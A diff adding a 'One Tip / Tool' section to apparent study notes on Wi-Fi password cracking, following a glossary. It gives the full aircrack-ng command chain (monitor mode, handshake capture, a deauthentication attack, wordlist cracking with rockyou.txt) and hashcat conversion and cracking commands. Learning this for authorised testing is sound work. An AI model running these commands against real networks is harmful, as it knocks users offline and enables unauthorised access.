@@ -44,3 +44,26 @@ From a defender's side, a long random password is the single most effective defe
 - Monitor Mode: a wireless adapter mode that captures all wireless traffic in range, not just traffic addressed to your device
 - SSID: the name of a Wi-Fi network
 - rockyou.txt: a massive leaked password list containing 14 million real passwords, the most commonly used wordlist for cracking
+
+## One Tip / Tool
+
+Tool: `aircrack-ng` suite — the standard toolkit for wireless attacks
+
+```bash
+# full attack chain in order
+airmon-ng start wlan0                                        # monitor mode
+airodump-ng wlan0mon                                         # find networks
+airodump-ng -c [channel] --bssid [router MAC] -w out wlan0mon  # capture
+aireplay-ng --deauth 10 -a [router MAC] wlan0mon             # force handshake
+aircrack-ng out.cap -w /usr/share/wordlists/rockyou.txt      # crack
+```
+
+For faster cracking use `hashcat` with GPU acceleration instead of aircrack-ng — it's significantly faster on large wordlists:
+
+```bash
+# convert cap file to hashcat format first
+cap2hccapx capture.cap capture.hccapx
+
+# crack with hashcat
+hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt
+```
